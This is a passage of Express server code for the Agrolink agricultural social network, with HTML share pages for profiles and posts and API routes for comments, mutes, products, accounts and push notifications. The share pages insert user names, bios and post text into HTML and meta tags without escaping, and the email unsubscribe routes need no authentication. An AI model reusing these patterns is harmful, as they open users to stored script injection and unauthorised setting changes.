.cta{display:block;background:linear-gradient(135deg,#2e7d32,#43a047);color:#fff;text-align:center;padding:15px;border-radius:14px;text-decoration:none;font-weight:700;font-size:15px;letter-spacing:.3px;transition:.2s;margin-top:4px}
.cta:hover{opacity:.9;transform:translateY(-1px)}
.posts-section{padding:0 20px 32px}
.posts-title{color:#888;font-size:12px;font-weight:600;letter-spacing:1px;text-transform:uppercase;margin-bottom:10px}
.posts-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:3px;border-radius:16px;overflow:hidden}
.grid-item{aspect-ratio:1;background:#222 center/cover no-repeat;display:block;position:relative;overflow:hidden;transition:.2s}
.grid-item:hover{opacity:.85}
.video-item{background:#1a1a1a;display:flex;align-items:center;justify-content:center}
.play-icon{width:44px;height:44px;background:rgba(255,255,255,.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff}
.powered{text-align:center;padding:20px;color:#444;font-size:12px}
.powered span{color:#4caf50}
.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:#1e1e1e;color:#fff;padding:12px 20px;border-radius:12px;font-size:14px;font-weight:500;border:1px solid #333;transition:.3s;z-index:100;opacity:0}
.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
@media(max-width:400px){.name{font-size:18px}.stat-val{font-size:18px}}
</style>
</head>
<body>
<div class="container">
  <div class="hero">
    <div class="hero-gradient"></div>
    <a href="${base}" class="back-btn">🌾 Agrolink</a>
    <button class="share-btn" onclick="copyLink()">⬆ Paylaş</button>
  </div>
  <div class="profile-card">
    <div class="profile-header">
      <div class="avatar-wrap">
        <img src="${picUrl}" class="avatar" onerror="this.onerror=null;this.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';this.style='background:#222;border-radius:50%'">
        ${user.isOnline ? '<div class="online-dot"></div>' : ''}
      </div>
    </div>
    <div class="name-row">
      <span class="name">${user.name}</span>
      ${user.isVerified ? '<span class="verified">✅</span>' : ''}
    </div>
    <div class="handle">@${user.username}</div>
    <div class="badge">${userTypeBadge}</div>
    ${bio ? `<div class="bio">${bio}</div>` : ''}
    ${user.location ? `<div class="meta"><span class="meta-item">📍 ${user.location}</span></div>` : ''}
    <div class="stats">
      <div class="stat"><div class="stat-val">${user.postCount ?? 0}</div><div class="stat-lbl">Gönderi</div></div>
      <div class="stat"><div class="stat-val">${user.followerCount ?? 0}</div><div class="stat-lbl">Takipçi</div></div>
      <div class="stat"><div class="stat-val">${user.followingCount ?? 0}</div><div class="stat-lbl">Takip</div></div>
    </div>
    <a href="${base}/u/${user.username}" class="cta">🌾 Agrolink'te Görüntüle</a>
  </div>
  ${recentPosts.length > 0 ? `
  <div class="posts-section">
    <div class="posts-title">Son Gönderiler</div>
    <div class="posts-grid">${gridHtml}</div>
  </div>` : ''}
  <div class="powered">Powered by <span>Agrolink</span></div>
</div>
<div class="toast" id="toast">🔗 Link kopyalandı!</div>
<script>
function copyLink(){
  navigator.clipboard.writeText(window.location.href).then(()=>{
    const t=document.getElementById('toast');
    t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),2200);
  }).catch(()=>{
    const inp=document.createElement('input');
    inp.value=window.location.href;
    document.body.appendChild(inp);
    inp.select();
    document.execCommand('copy');
    document.body.removeChild(inp);
    const t=document.getElementById('toast');
    t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),2200);
  });
}
</script>
</body></html>`);
    } catch(e) { console.error(e); res.status(500).send('<h2>Sunucu hatası</h2>'); }
});

// ─── GÖNDERI PAYLAŞ: /share/post/:postId ───────────────────────────
app.get('/share/post/:postId', async (req, res) => {
    try {
        const post = await dbGet(`
            SELECT p.*, u.username, u.name AS "userName", u."profilePic" AS "userProfilePic",
                   u."isVerified" AS "userVerified", u."userType",
                   (SELECT COUNT(*)::int FROM likes   WHERE "postId"=p.id) AS "likeCount",
                   (SELECT COUNT(*)::int FROM comments c WHERE c."postId"=p.id AND c."isActive"=TRUE) AS "commentCount"
            FROM posts p JOIN users u ON p."userId"=u.id
            WHERE p.id=$1 AND p."isActive"=TRUE AND u."isActive"=TRUE`, [req.params.postId]);
        if (!post) return res.status(404).send('<h2>Gönderi bulunamadı</h2>');

        const base      = `${req.protocol}://${req.get('host')}`;
        const picUrl    = post.userProfilePic ? `${base}${post.userProfilePic}` : `${base}/default-avatar.png`;
        const date      = new Date(post.createdAt).toLocaleDateString('tr-TR', {day:'numeric',month:'long',year:'numeric'});
        const content_text = (post.content || '').substring(0, 500);

        let mediaHtml = '';
        if (post.media) {
            if (post.mediaType === 'video') {
                const isHLS = post.media.endsWith('.m3u8');
                const posterAttr = post.thumbnailUrl ? `poster="${base}${post.thumbnailUrl}"` : '';
                if (isHLS) {
                    mediaHtml = `<div class="media-wrap">
<video id="sv" controls playsinline ${posterAttr} style="width:100%;max-height:480px;object-fit:contain;background:#000;display:block"></video>
<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"><\/script>
<script>
(function(){
  var v=document.getElementById('sv');
  var s='${base}${post.media}';
  if(window.Hls&&Hls.isSupported()){var h=new Hls();h.loadSource(s);h.attachMedia(v);}
  else if(v.canPlayType('application/vnd.apple.mpegurl')){v.src=s;}
  else{v.src='${base}${post.media.replace('.m3u8','.mp4')}';}
})();
<\/script>
</div>`;
                } else {
                    mediaHtml = `<div class="media-wrap"><video controls playsinline ${posterAttr} style="width:100%;max-height:480px;object-fit:contain;background:#000;display:block"><source src="${base}${post.media}" type="video/mp4"></video></div>`;
                }
            } else {
                mediaHtml = `<div class="media-wrap"><img src="${base}${post.media}" style="width:100%;max-height:520px;object-fit:cover;display:block" onerror="this.style.display='none'"></div>`;
            }
        }

        const ogImage = (post.media && post.mediaType !== 'video') ? `${base}${post.media}` : picUrl;

        res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>${post.userName} Agrolink Gönderisi</title>
<meta property="og:title" content="${post.userName} - Agrolink">
<meta property="og:description" content="${(post.content||'').substring(0,200)}">
<meta property="og:image" content="${ogImage}">
<meta property="og:url" content="${base}/share/post/${post.id}">
<meta property="og:type" content="article">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0a0a0a;min-height:100vh;color:#fff}
.container{max-width:520px;margin:0 auto;padding-bottom:40px}
.top-bar{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #1a1a1a}
.logo{color:#4caf50;font-weight:800;font-size:17px;text-decoration:none;display:flex;align-items:center;gap:6px}
.share-btn{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#fff;padding:8px 14px;border-radius:50px;cursor:pointer;font-size:13px;font-weight:500;display:flex;align-items:center;gap:5px;font-family:inherit}
.share-btn:hover{background:rgba(255,255,255,.14)}
.card{background:#111;margin:12px 16px;border-radius:20px;overflow:hidden;border:1px solid #1e1e1e}
.post-header{display:flex;align-items:center;gap:12px;padding:14px 16px}
.avatar{width:44px;height:44px;border-radius:50%;object-fit:cover;background:#222;flex-shrink:0}
.user-info{flex:1;min-width:0}
.user-name{font-weight:700;font-size:15px;color:#fff;display:flex;align-items:center;gap:5px;flex-wrap:wrap}
.user-handle{color:#666;font-size:13px;margin-top:1px}
.verified{color:#4caf50;font-size:14px}
.post-date{color:#555;font-size:12px;font-weight:400;margin-left:auto;white-space:nowrap;flex-shrink:0}
.media-wrap{background:#000;line-height:0}
.post-content{padding:14px 16px 10px;font-size:15px;line-height:1.65;color:#e0e0e0;white-space:pre-wrap;word-break:break-word}
.post-stats{display:flex;gap:20px;padding:10px 16px 14px;border-top:1px solid #1a1a1a;margin-top:6px}
.stat-item{display:flex;align-items:center;gap:6px;color:#666;font-size:13px;font-weight:500}
.stat-item span{font-weight:700;color:#aaa}
.cta-section{padding:0 16px}
.cta{display:flex;align-items:center;justify-content:center;gap:8px;background:linear-gradient(135deg,#2e7d32,#43a047);color:#fff;text-align:center;padding:16px;border-radius:16px;text-decoration:none;font-weight:700;font-size:15px;transition:.2s;letter-spacing:.3px}
.cta:hover{opacity:.9;transform:translateY(-1px)}
.related-label{color:#555;font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;padding:20px 16px 10px}
.powered{text-align:center;padding:24px;color:#333;font-size:12px}
.powered span{color:#4caf50}
.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:#1e1e1e;color:#fff;padding:12px 20px;border-radius:12px;font-size:14px;font-weight:500;border:1px solid #2e7d32;transition:.3s;z-index:100;opacity:0}
.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
</style>
</head>
<body>
<div class="container">
  <div class="top-bar">
    <a href="${base}" class="logo">🌾 Agrolink</a>
    <button class="share-btn" onclick="copyLink()">⬆ Paylaş</button>
  </div>

  <div class="card">
    <div class="post-header">
      <img src="${picUrl}" class="avatar" onerror="this.onerror=null;this.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';this.style='background:#222;border-radius:50%'">
      <div class="user-info">
        <div class="user-name">
          ${post.userName}
          ${post.userVerified ? '<span class="verified">✅</span>' : ''}
        </div>
        <div class="user-handle">@${post.username}</div>
      </div>
      <div class="post-date">${date}</div>
    </div>

    ${mediaHtml}

    ${content_text ? `<div class="post-content">${content_text}</div>` : ''}

    <div class="post-stats">
      <div class="stat-item">❤️ <span>${post.likeCount ?? 0}</span> beğeni</div>
      <div class="stat-item">💬 <span>${post.commentCount ?? 0}</span> yorum</div>
      <div class="stat-item">👁️ <span>${post.views ?? 0}</span> görüntülenme</div>
    </div>
  </div>

  <div class="cta-section">
    <a href="${base}" class="cta">🌾 Agrolink'te Görüntüle →</a>
  </div>

  <div class="powered">Powered by <span>Agrolink</span></div>
</div>
<div class="toast" id="toast">🔗 Link kopyalandı!</div>
<script>
function copyLink(){
  navigator.clipboard.writeText(window.location.href).then(()=>{
    const t=document.getElementById('toast');
    t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),2200);
  }).catch(()=>{
    const inp=document.createElement('input');
    inp.value=window.location.href;
    document.body.appendChild(inp);
    inp.select();
    document.execCommand('copy');
    document.body.removeChild(inp);
    const t=document.getElementById('toast');
    t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),2200);
  });
}
</script>
</body></html>`);
    } catch(e) { console.error(e); res.status(500).send('<h2>Sunucu hatası</h2>'); }
});

// ═══════════════════════════════════════════════════════════════════════
// 📦 EKSİK API'LAR (v5 SQLite uyumluluğu)
// ═══════════════════════════════════════════════════════════════════════

// ─── 1. YORUM CEVAPLARI: GET /api/comments/:id/replies ──────────────
app.get('/api/comments/:id/replies', authenticateToken, async (req, res) => {
    try {
        const replies = await dbAll(
            `SELECT c.*, u.name, u.username, u."profilePic", u."isVerified",
                    (SELECT COUNT(*)::int FROM likes WHERE "commentId"=c.id) AS "likeCount",
                    EXISTS(SELECT 1 FROM likes WHERE "commentId"=c.id AND "userId"=$2) AS "isLiked"
             FROM comments c JOIN users u ON c."userId"=u.id
             WHERE c."parentId"=$1 AND c."isActive"=TRUE
             ORDER BY c."createdAt" ASC`,
            [req.params.id, req.user.id]
        );
        res.json({ replies: replies || [] });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 2. YORUM SİL: DELETE /api/posts/:id/comments/:commentId ────────
app.delete('/api/posts/:id/comments/:commentId', authenticateToken, async (req, res) => {
    try {
        const comment = await dbGet(
            'SELECT * FROM comments WHERE id=$1 AND "isActive"=TRUE', [req.params.commentId]
        );
        if (!comment) return res.status(404).json({ error: 'Yorum bulunamadı' });

        const post = await dbGet('SELECT "userId" FROM posts WHERE id=$1', [req.params.id]);
        const isOwner = comment.userId === req.user.id;
        const isPostOwner = post?.userId === req.user.id;
        const isAdmin = req.user.role === 'admin';

        if (!isOwner && !isPostOwner && !isAdmin) {
            return res.status(403).json({ error: 'Yetki yok' });
        }

        await dbRun('UPDATE comments SET "isActive"=FALSE, "updatedAt"=NOW() WHERE id=$1', [req.params.commentId]);
        // Yorum sayacını azalt
        await dbRun('UPDATE posts SET "commentCount"=GREATEST(0, COALESCE("commentCount",0)-1) WHERE id=$1', [req.params.id]);
        res.json({ success: true });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 3. YORUM CEVAPLA: POST /api/comments/:id/replies ───────────────
app.post('/api/comments/:id/replies', authenticateToken, async (req, res) => {
    try {
        const { content } = req.body;
        if (!content?.trim()) return res.status(400).json({ error: 'Cevap içeriği gerekli' });

        const parent = await dbGet(
            'SELECT * FROM comments WHERE id=$1 AND "isActive"=TRUE', [req.params.id]
        );
        if (!parent) return res.status(404).json({ error: 'Yorum bulunamadı' });

        const user = await dbGet('SELECT username FROM users WHERE id=$1', [req.user.id]);
        const replyId = uuidv4();

        await dbRun(
            `INSERT INTO comments (id, "postId", "userId", username, content, "parentId", "isActive", "createdAt", "updatedAt")
             VALUES ($1,$2,$3,$4,$5,$6,TRUE,NOW(),NOW())`,
            [replyId, parent.postId, req.user.id, user.username, content.trim(), req.params.id]
        );

        const reply = await dbGet(
            `SELECT c.*, u.name, u.username, u."profilePic", u."isVerified"
             FROM comments c JOIN users u ON c."userId"=u.id WHERE c.id=$1`,
            [replyId]
        );
        res.status(201).json({ reply });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 4. KULLANICI SUSTUR/SUSTURMA KALDIR: POST/DELETE /api/users/:id/mute
app.post('/api/users/:id/mute', authenticateToken, async (req, res) => {
    try {
        const targetId = req.params.id;
        if (targetId === req.user.id) return res.status(400).json({ error: 'Kendinizi susamazsınız' });

        await dbRun(
            `INSERT INTO mutes (id, "userId", "mutedId", "createdAt")
             VALUES ($1,$2,$3,NOW()) ON CONFLICT ("userId","mutedId") DO NOTHING`,
            [uuidv4(), req.user.id, targetId]
        ).catch(async () => {
            // Tablo yoksa oluştur
            await dbRun(`CREATE TABLE IF NOT EXISTS mutes (
                id UUID PRIMARY KEY, "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                "mutedId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                "createdAt" TIMESTAMPTZ DEFAULT NOW(),
                UNIQUE("userId","mutedId"))`);
            await dbRun(`INSERT INTO mutes (id,"userId","mutedId","createdAt") VALUES ($1,$2,$3,NOW()) ON CONFLICT DO NOTHING`,
                [uuidv4(), req.user.id, targetId]);
        });
        res.json({ success: true, message: 'Kullanıcı susturuldu' });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

app.delete('/api/users/:id/mute', authenticateToken, async (req, res) => {
    try {
        await dbRun('DELETE FROM mutes WHERE "userId"=$1 AND "mutedId"=$2', [req.user.id, req.params.id]);
        res.json({ success: true, message: 'Susturma kaldırıldı' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

app.get('/api/users/muted', authenticateToken, async (req, res) => {
    try {
        const muted = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", m."createdAt"
             FROM mutes m JOIN users u ON m."mutedId"=u.id
             WHERE m."userId"=$1 ORDER BY m."createdAt" DESC`,
            [req.user.id]
        ).catch(() => []);
        res.json({ muted });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 5. STORY REAKSİYON: POST /api/stories/:id/react ───────────────
app.post('/api/stories/:id/react', authenticateToken, async (req, res) => {
    try {
        const { emoji = '❤️' } = req.body;
        const story = await dbGet('SELECT id,"userId" FROM stories WHERE id=$1 AND "isActive"=TRUE', [req.params.id]);
        if (!story) return res.status(404).json({ error: 'Story bulunamadı' });

        await dbRun(
            `INSERT INTO story_reactions (id,"storyId","userId",emoji,"createdAt")
             VALUES ($1,$2,$3,$4,NOW())
             ON CONFLICT ("storyId","userId") DO UPDATE SET emoji=$4,"createdAt"=NOW()`,
            [uuidv4(), req.params.id, req.user.id, emoji]
        ).catch(async () => {
            await dbRun(`CREATE TABLE IF NOT EXISTS story_reactions (
                id UUID PRIMARY KEY, "storyId" UUID NOT NULL REFERENCES stories(id) ON DELETE CASCADE,
                "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                emoji TEXT DEFAULT '❤️', "createdAt" TIMESTAMPTZ DEFAULT NOW(),
                UNIQUE("storyId","userId"))`);
            await dbRun(`INSERT INTO story_reactions (id,"storyId","userId",emoji,"createdAt") VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT DO NOTHING`,
                [uuidv4(), req.params.id, req.user.id, emoji]);
        });

        // Story sahibine bildirim
        if (story.userId !== req.user.id) {
            await createNotification(story.userId, 'story_reaction',
                `Hikayen ${emoji} reaksiyonu aldı`, { storyId: req.params.id });
        }
        res.json({ success: true, emoji });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 6. POST PAYLAŞ SAYACI: POST /api/posts/:id/share ───────────────
app.post('/api/posts/:id/share', authenticateToken, async (req, res) => {
    try {
        const post = await dbGet('SELECT id,"userId","shareCount" FROM posts WHERE id=$1 AND "isActive"=TRUE', [req.params.id]);
        if (!post) return res.status(404).json({ error: 'Post bulunamadı' });

        await dbRun(
            'UPDATE posts SET "shareCount"=COALESCE("shareCount",0)+1,"updatedAt"=NOW() WHERE id=$1',
            [req.params.id]
        );

        // Paylaşım kaydı
        await dbRun(
            `INSERT INTO post_shares (id,"postId","userId","createdAt") VALUES ($1,$2,$3,NOW()) ON CONFLICT DO NOTHING`,
            [uuidv4(), req.params.id, req.user.id]
        ).catch(async () => {
            await dbRun(`CREATE TABLE IF NOT EXISTS post_shares (
                id UUID PRIMARY KEY, "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
                "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                "createdAt" TIMESTAMPTZ DEFAULT NOW(), UNIQUE("postId","userId"))`);
        });

        const shareUrl = `${req.protocol}://${req.get('host')}/share/post/${req.params.id}`;
        res.json({ success: true, shareUrl, shareCount: (post.shareCount || 0) + 1 });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 7. HESAP SİL: DELETE /api/users/account/delete ────────────────
app.delete('/api/users/account/delete', authenticateToken, async (req, res) => {
    try {
        const { password } = req.body;
        if (!password) return res.status(400).json({ error: 'Şifre gerekli' });

        // 🔒 Sadece şifre doğrulaması için gerekli alan çekiliyor
        const user = await dbGet('SELECT id, password FROM users WHERE id=$1', [req.user.id]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        const valid = await bcrypt.compare(password, user.password);
        if (!valid) return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });

        // Soft delete
        await dbRun(
            `UPDATE users SET "isActive"=FALSE, email=CONCAT('deleted_',$1,'_',email),
             username=CONCAT('deleted_',$1,'_',username), "updatedAt"=NOW() WHERE id=$1`,
            [req.user.id]
        );
        await dbRun('DELETE FROM refresh_tokens WHERE "userId"=$1', [req.user.id]);

        console.log(`🗑️ Hesap silindi: ${user.username} (${user.id})`);
        res.json({ success: true, message: 'Hesabınız başarıyla silindi.' });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── MAĞAZA EKSİK ROTALAR ─────────────────────────────────────────
// Satıcının ürünleri
app.get('/api/store/products/seller/:sellerId', authenticateToken, async (req, res) => {
    try {
        const products = await dbAll(
            `SELECT p.*, u.username AS "sellerName", u."profilePic" AS "sellerPic"
             FROM products p JOIN users u ON p."sellerId"=u.id
             WHERE p."sellerId"=$1 AND p."isActive"=TRUE ORDER BY p."createdAt" DESC`,
            [req.params.sellerId]);
        res.json({ products });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// Kendi ürünleri (alias)
app.get('/api/products/my', authenticateToken, async (req, res) => {
    try {
        const products = await dbAll(
            `SELECT * FROM products WHERE "sellerId"=$1 ORDER BY "createdAt" DESC`, [req.user.id]);
        res.json({ products });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// Tüm ürünler (alias /api/products)
app.get('/api/products', authenticateToken, async (req, res) => {
    try {
        const { page=1, limit=20, category, q } = req.query;
        const pn=Math.max(1,parseInt(page)||1), ln=Math.min(parseInt(limit)||20,100);
        const off=(pn-1)*ln;
        const conds=['"isActive"=TRUE'], params=[]; let pi=1;
        if (category){ conds.push(`category=$${pi++}`); params.push(category); }
        if (q){ conds.push(`(name ILIKE $${pi} OR description ILIKE $${pi})`); params.push(`%${q}%`); pi++; }
        const products = await dbAll(
            `SELECT p.*,u.username AS "sellerName",u."profilePic" AS "sellerPic" FROM products p JOIN users u ON p."sellerId"=u.id WHERE ${conds.join(' AND ')} ORDER BY p."createdAt" DESC LIMIT $${pi} OFFSET $${pi+1}`,
            [...params, ln, off]);
        res.json({ products });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// Kullanıcıya ait ürünler
app.get('/api/users/:userId/products', authenticateToken, async (req, res) => {
    try {
        const products = await dbAll(
            `SELECT * FROM products WHERE "sellerId"=$1 AND "isActive"=TRUE ORDER BY "createdAt" DESC`, [req.params.userId]);
        res.json({ products });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// Ürün sil (alias /api/products/:productId)
app.delete('/api/products/:productId', authenticateToken, async (req, res) => {
    try {
        const p = await dbGet('SELECT "sellerId" FROM products WHERE id=$1', [req.params.productId]);
        if (!p) return res.status(404).json({ error: 'Ürün bulunamadı' });
        if (p.sellerId !== req.user.id) return res.status(403).json({ error: 'Yetki yok' });
        await dbRun('UPDATE products SET "isActive"=FALSE,"updatedAt"=NOW() WHERE id=$1', [req.params.productId]);
        res.json({ message: 'Ürün silindi' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── POST KAYDET SİL: DELETE /api/posts/:id/save ───────────────────
app.delete('/api/posts/:id/save', authenticateToken, async (req, res) => {
    try {
        const save = await dbGet('SELECT id FROM saves WHERE "postId"=$1 AND "userId"=$2', [req.params.id, req.user.id]);
        if (!save) return res.status(404).json({ error: 'Kayıt bulunamadı' });
        await dbRun('DELETE FROM saves WHERE id=$1', [save.id]);
        await dbRun('UPDATE posts SET "saveCount"=GREATEST(0,COALESCE("saveCount",0)-1) WHERE id=$1', [req.params.id]).catch(()=>{});
        res.json({ message: 'Kayıt kaldırıldı', isSaved: false });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── KONUŞMA SİL: DELETE /api/messages/conversations/:userId ───────
app.delete('/api/messages/conversations/:userId', authenticateToken, async (req, res) => {
    try {
        const partnerId = req.params.userId;
        await dbRun(
            'DELETE FROM messages WHERE ("senderId"=$1 AND "recipientId"=$2) OR ("senderId"=$2 AND "recipientId"=$1)',
            [req.user.id, partnerId]);
        res.json({ message: 'Konuşma silindi' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── FARMBOOK TARLALAR: GET /api/farmbook/fields ───────────────────
app.get('/api/farmbook/fields', authenticateToken, async (req, res) => {
    try {
        const fields = await dbAll(
            `SELECT DISTINCT "fieldName", "fieldSize", "fieldSizeUnit", MAX("recordDate") AS "lastRecord"
             FROM farmbook_records WHERE "userId"=$1 AND "fieldName" IS NOT NULL
             GROUP BY "fieldName","fieldSize","fieldSizeUnit" ORDER BY "lastRecord" DESC`,
            [req.user.id]);
        res.json({ fields });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── HESAP SİL ─────────────────────────────────────────────────────
app.delete('/api/users/account', authenticateToken, async (req, res) => {
    try {
        const { password } = req.body;
        if (!password) return res.status(400).json({ error: 'Şifre gerekli' });
        const user = await dbGet('SELECT password FROM users WHERE id=$1', [req.user.id]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        const valid = await bcrypt.compare(password, user.password);
        if (!valid) return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });
        await dbRun('UPDATE users SET "isActive"=FALSE,"updatedAt"=NOW() WHERE id=$1', [req.user.id]);
        await dbRun('DELETE FROM refresh_tokens WHERE "userId"=$1', [req.user.id]).catch(()=>{});
        res.json({ message: 'Hesap silindi' });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── PUSH BİLDİRİM DURUM: /api/push/status ─────────────────────────
app.get('/api/push/status', authenticateToken, async (req, res) => {
    try {
        const sub = await dbGet('SELECT id FROM push_subscriptions WHERE "userId"=$1 LIMIT 1', [req.user.id]).catch(()=>null);
        res.json({ subscribed: !!sub });
    } catch (e) { res.json({ subscribed: false }); }
});

// ─── PUSH SUBSCRIBE ────────────────────────────────────────────────
app.post('/api/push/subscribe', authenticateToken, async (req, res) => {
    try {
        const { endpoint, keys } = req.body;
        if (!endpoint) return res.status(400).json({ error: 'Endpoint gerekli' });
        await dbRun(
            `INSERT INTO push_subscriptions (id,"userId",endpoint,keys,"createdAt")
             VALUES ($1,$2,$3,$4,NOW())
             ON CONFLICT("userId",endpoint) DO UPDATE SET keys=$4,"updatedAt"=NOW()`,
            [uuidv4(), req.user.id, endpoint, JSON.stringify(keys||{})]).catch(async()=>{
            // Tablo yoksa oluştur
            await dbRun(`CREATE TABLE IF NOT EXISTS push_subscriptions (id UUID PRIMARY KEY, "userId" UUID, endpoint TEXT, keys JSONB, "createdAt" TIMESTAMPTZ DEFAULT NOW(), "updatedAt" TIMESTAMPTZ, UNIQUE("userId",endpoint))`).catch(()=>{});
            await dbRun(`INSERT INTO push_subscriptions (id,"userId",endpoint,keys,"createdAt") VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT DO NOTHING`,[uuidv4(),req.user.id,endpoint,JSON.stringify(keys||{})]).catch(()=>{});
        });
        res.json({ message: 'Push aboneliği kaydedildi' });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── DOĞRULAMA DURUM (alias): /api/verification/status ─────────────
app.get('/api/verification/status', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet('SELECT "isVerified","emailVerified" FROM users WHERE id=$1', [req.user.id]);
        res.json({ isVerified: !!user?.isVerified, emailVerified: !!user?.emailVerified });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── KULLANICI İLGİ ALANLARI ────────────────────────────────────────
app.post('/api/users/interests', authenticateToken, async (req, res) => {
    try {
        const { interests } = req.body;
        if (!interests || !Array.isArray(interests)) return res.status(400).json({ error: 'interests dizisi gerekli' });
        await dbRun('DELETE FROM user_interests WHERE "userId"=$1', [req.user.id]).catch(()=>{});
        for (const interest of interests.slice(0,100)) {
            if (interest?.trim()) {
                await dbRun(`INSERT INTO user_interests (id,"userId",interest,"createdAt") VALUES ($1,$2,$3,NOW()) ON CONFLICT DO NOTHING`,[uuidv4(),req.user.id,interest.trim()]).catch(()=>{});
            }
        }
        res.json({ message: 'İlgi alanları kaydedildi', count: interests.length });
    } catch (e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});
app.get('/api/users/interests', authenticateToken, async (req, res) => {
    try {
        const rows = await dbAll('SELECT interest FROM user_interests WHERE "userId"=$1 ORDER BY "createdAt"', [req.user.id]).catch(()=>[]);
        res.json({ interests: rows.map(r=>r.interest) });
    } catch (e) { res.json({ interests: [] }); }
});

// ─── E-POSTA ABONELIK YÖNET ────────────────────────────────────────
app.get('/api/email/unsubscribe/:userId', async (req, res) => {
    try {
        await dbRun('UPDATE users SET "emailNotifications"=FALSE,"updatedAt"=NOW() WHERE id=$1', [req.params.userId]).catch(()=>{});
        res.send('<html><body style="font-family:sans-serif;text-align:center;padding:40px"><h2>✅ E-posta bildirimlerinden çıkıldı.</h2><p>Agrolink e-posta bildirimleri durduruldu.</p></body></html>');
    } catch (e) { res.status(500).send('Hata oluştu'); }
});
app.get('/api/email/resubscribe/:userId', async (req, res) => {
    try {
        await dbRun('UPDATE users SET "emailNotifications"=TRUE,"updatedAt"=NOW() WHERE id=$1', [req.params.userId]).catch(()=>{});
        res.send('<html><body style="font-family:sans-serif;text-align:center;padding:40px"><h2>✅ E-posta bildirimleri yeniden etkinleştirildi.</h2></body></html>');
    } catch (e) { res.status(500).send('Hata oluştu'); }
});

// ─── ŞIFRE SIFIRLAMA HTML SAYFALARI ──────────────────────────────────
function getPasswordResetPageHtml(username, resetToken) {
    return `<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Şifre Sıfırlama - Agrolink</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a5d1a, #2e7d32, #4caf50);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #d32f2f, #f44336);
            padding: 30px;
            text-align: center;
            color: white;
        }
        .header .icon { font-size: 48px; margin-bottom: 10px; }
        .header h1 { font-size: 24px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .alert {
            background: #fff8e1;
            border-left: 4px solid #ff9800;
            padding: 15px;
